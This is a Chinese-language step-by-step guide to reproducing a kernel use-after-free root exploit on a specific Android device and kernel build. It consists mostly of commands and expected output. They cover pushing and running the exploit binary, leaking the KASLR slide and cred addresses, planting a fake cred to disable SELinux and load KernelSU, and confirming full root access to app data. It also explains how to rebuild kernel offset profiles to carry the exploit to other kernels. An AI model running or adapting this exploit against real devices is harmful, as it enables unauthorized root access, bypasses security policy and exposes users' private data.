# 11 · 从零复现指南

> 这一章是给「拿到了一台同样的设备」的人看的。照着做应该能复现。
> **如果你的是别的机型/内核，先看第 0 节。**

---

## 0. 适用范围检查

```bash
./scripts/check-device.sh
```

或者手动：

```bash
adb shell getprop ro.product.device      # 期望: flare
adb shell getprop ro.product.model       # 期望: 24075RP89G
adb shell getprop ro.build.display.id    # 期望: ...OS3.0.303.0.WHXMIXM...
adb shell uname -r                       # 期望: 6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
adb shell getenforce                     # 期望: Enforcing
adb shell getprop ro.boot.verifiedbootstate  # 期望: green
```

**内核串必须完全一致** —— exploit 的 profile 是按完整字符串匹配的。

**如果你的内核串只是前缀相同而 commit 不同：**
- 先试现有二进制（可能失败）
- 失败的话需要**重新生成 profile**（见第 6 节）

---

## 1. 准备

### 1.1 需要的文件

| 文件 | 来源 |
|---|---|
| `shark-k66118-fixed` | 本仓库 `artifacts/` |
| `ksud-3.3.1` | 本仓库 `artifacts/`，或从 KernelSU APK 的 `lib/arm64-v8a/libksud.so` 提取 |
| KernelSU 管理器 APK | [tiann/KernelSU v3.3.1 (32680)](https://github.com/tiann/KernelSU/releases/download/v3.3.1/KernelSU_v3.3.1_32680-release.apk) |

**⚠️ 版本必须匹配**：管理器 v3.3.1 (32680) ↔ ksud 3.3.1 (uapi: 5)。
3.1.0 的 ksud 配 3.3.1 的管理器会出问题。

### 1.2 推到设备

```bash
adb push artifacts/shark-k66118-fixed /data/local/tmp/shark66118
adb push artifacts/ksud-3.3.1        /data/local/tmp/ksud33
adb shell 'chmod 755 /data/local/tmp/shark66118 /data/local/tmp/ksud33'
```

### 1.3 装 KernelSU 管理器

```bash
adb install -r -g KernelSU_v3.3.1_32680-release.apk
```

验证：

```bash
adb shell dumpsys package me.weishu.kernelsu | grep -E 'versionName|versionCode'
# versionCode=32680
# versionName=v3.3.1
```

### 1.4 （可选）装 Shizuku

Shark 的 App 版本需要 Shizuku/Stellar。**但直接用二进制不需要。**
我们走的是二进制路线，所以这步可以跳过。

---

## 2. 自检（零风险）

先确认 tracefs 通路正常：

```bash
adb shell '/data/local/tmp/shark66118 probe'
```

**期望输出：**

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
[probe] pid=18234 cpu=2 uid=2000
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
PROBE_TIMER made=128 recs=128 site=0xffffffebc5415d48 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=21 best=0xffffff7fc0000000 count=330
PROBE_LINEAR_MAP=0xffffff7fc0000000
[cred] attempt=0 child=18236 R=0xffffff80c117a180 site_low=0x164064 recs=1 task=0xffffff807a40cb00 task_recs=1
PROBE_TASK=0xffffff807a40cb00 expected_low21=0xab93c
PROBE_CRED=0xffffff80c117a180 req=0xb8 alloc=0xc0 uid_off=0x8
PROBE_SELINUX_BLOB size=0x18 osid=0x0 sid=0x4 exec_sid=0x8 create_sid=0xc set=exec_sid/create_sid=1
PROBE_OK
```

### 判读

| 输出 | 含义 | 不对怎么办 |
|---|---|---|
| `PROBE_TRACE=no` | tracefs 打不开 | 检查 shell 是否在 `readtracefs` 组 |
| `[calib] timers=0` | **KASLR 低21位问题** | 见 [09 章](09-root-cause.md) |
| `task_recs=0` | 同上 | 同上 |
| `PROBE_SLIDE=... aligned=0` | 非 2MiB 对齐 | **这是正常的，我们的修复已处理** |
| `PROBE_TIMER_FAIL` | timer 事件没抓到 | 检查 `low_adj` 是否被识别 |

**`probe` 模式完全无害** —— 它只做泄漏和自检，不触发 UAF。

---

## 3. 开打

```bash
adb shell "cd /data/local/tmp && \
  PYB110_KSUD=/data/local/tmp/ksud33 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KMI=android15-6.6 \
  ./shark66118 --auto"
```

### 环境变量说明

| 变量 | 值 | 作用 |
|---|---|---|
| `PYB110_KSUD` | `/data/local/tmp/ksud33` | ksud 二进制的路径 |
| `PYB110_MANAGER_PKG` | `me.weishu.kernelsu` | KernelSU 管理器包名 |
| `PYB110_KMI` | `android15-6.6` | 我们的 KMI |

### 期望的成功输出

```
[calib] timers=512 low_adj=0x80000
[base] best=0xffffff7fc0000000 count=202
[cred] R=0xffffff... task=0xffffff... task_recs=1
[+] stage fake_cred  ... burst hit=1
[+] stage selinux    ... burst hit=1
[ksu] panic_on_warn=0
[+] stage fake_uid   ... burst hit=1
[+] child report stage=2 uid=0 euid=0 resuid=0/0/0
PLANT_CRED_OK child=...
PARKED=1
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

### 如果失败了

```
[+] plant1 free_seen=1 burst hit=0
[-] plant1 burst missed; holding zombie
FAIL=fake-uid REASON=fake-uid
[!] failed plant zombies held -- parking without reap
```

**⇒ 直接重跑同一条命令。** 失败是概率问题，不是配置问题。

**我们实测约 2/3 一次成功。**

---

## 4. 验证

```bash
# 1) 内核模块
adb shell grep kernelsu /proc/modules
# 期望: kernelsu 180224 4 - Live ...

# 2) root 身份
adb shell su -c id
# 期望: uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

# 3) 完整能力集
adb shell su -c 'grep Cap /proc/self/status'
# 期望: CapPrm/CapEff/CapBnd = 000001ffffffffff

# 4) 真实访问
adb shell su -c 'ls /data/adb'
adb shell su -c 'ls /data/data | head -3'
adb shell su -c 'cat /proc/kallsyms | head -2'

# 5) 写测试
adb shell su -c 'echo ok > /data/adb/t && cat /data/adb/t && rm /data/adb/t'
```

**五项全过 = 完整 root。**

---

## 5. 恢复 / 清理

### 5.1 恢复正常（重启即可）

```bash
adb reboot
```

**重启后：**
- root 消失
- 内核模块卸载
- SELinux 回到 Enforcing
- 设备完全正常

**没有留下任何持久修改。**

### 5.2 如果卡住了

如果 `PARKED` 的进程占着内存不放：

```bash
adb shell 'ps -A | grep shark'      # 找到 holder
adb reboot                          # 最干净的办法
```

**⚠️ 不要手动 kill 那个 parked 进程** —— 它持有的假 cred 页被释放后，
内核里还有 task 指向它，可能崩。

---

## 6. 换机型 / 换内核怎么办

### 6.1 先判断漏洞在不在

```
CVE-2026-98260 修复版本：6.1.191 / 6.6.158 / 6.12.112 / 6.18.54 / 7.2.8
```

**但如果你的 OEM 提前 backport 了，版本号看不出来。必须反汇编验证。**

判据（见 [02 章](02-methodology.md)）：看 `begin_new_exec` 里
`posix_cpu_timers_exit` 的位置相对于 `exec_task_namespaces`。

**漏洞版：`posix_cpu_timers_exit` 在 `exec_task_namespaces` 之后。**

### 6.2 重新生成 profile

`K66118_plant.c` 里的 profile 结构：

```c
struct k66118_profile {
    const char *release;              /* uname -r 完整字符串 */
    unsigned long long timer_site;    /* do_timer_create+0xa8 链接地址 */
    unsigned long long timer_low21;   /* 同上，低 21 位 */
    unsigned long long copy_low21;    /* copy_process+0x140 低 21 位 */
    unsigned long long selinux_state;
    unsigned long long panic_on_warn;
    unsigned long long root_user;
    unsigned long long init_user_ns;
    unsigned long long init_ucounts;
    unsigned long long init_groups;
};
```

**从目标内核的 vmlinux 里取：**

```console
$ python tools/kcalls.py do_timer_create | grep kmem_cache_alloc
  0xffffffc080195d44  bl -> kmem_cache_alloc        ← +0xa8 = 0x80195d48

$ python tools/kcalls.py copy_process | grep kmem_cache_alloc
  0xffffffc0800ab938  bl -> kmem_cache_alloc_node   ← +0x140 = 0xab93c

$ python -c "符号表里查 selinux_state / root_user / init_user_ns / ..."
```

### 6.3 还要重新测的

| 参数 | 来源 |
|---|---|
| `KITIMER_BYTES` | `/proc/slabinfo` 的 `posix_timers_cache` objsize |
| `SLAB_OBJECTS` | 同上 `objperslab` |
| `KITIMER_NODE` | 反汇编 `posix_cpu_timers_exit` |
| `CRED_REQ` / `CRED_ALLOC` | slabinfo `cred_jar` |
| `OFF_TASK_CRED` | BTF |
| `page_offset` / `MEMSTART_PFN` | `/proc/zoneinfo` + trace 配对 |

**⚠️ 而且别忘了 09 章那个坑：低 21 位要按 slide 补偿。**

---

## 7. 常见问题

### Q: 一直 `timers=0`

**A: 99% 是 KASLR 低21位问题。** 看 [09 章](09-root-cause.md)。
检查二进制是不是我们修过的版本：

```bash
adb shell 'strings /data/local/tmp/shark66118 | grep low_adj'
```

（我们的版本会在日志里打 `low_adj=`）

### Q: `LATE_LOAD_SKIP=env-missing`

**A: 没设 `PYB110_KSUD`。** 补上环境变量。

### Q: `LATE_LOAD_RC` 非 0

**A: ksud 版本和管理器不匹配。** 从管理器 APK 里提取 `lib/arm64-v8a/libksud.so`。

### Q: `su: not found`

**A: KSU 模块没加载成功。** 看 `grep kernelsu /proc/modules`。

### Q: 重启后 root 没了

**A: 正常。** 这是临时 root。重跑第 3 步。

### Q: 能不能持久化

**A: 不能，除非解锁 bootloader。** 我们全程零分区写入，
所以没有任何东西能在重启后存活。

（理论上拿到 root 后可以研究「写分区永久解锁」，但那有砖的风险，
本项目没有做。）
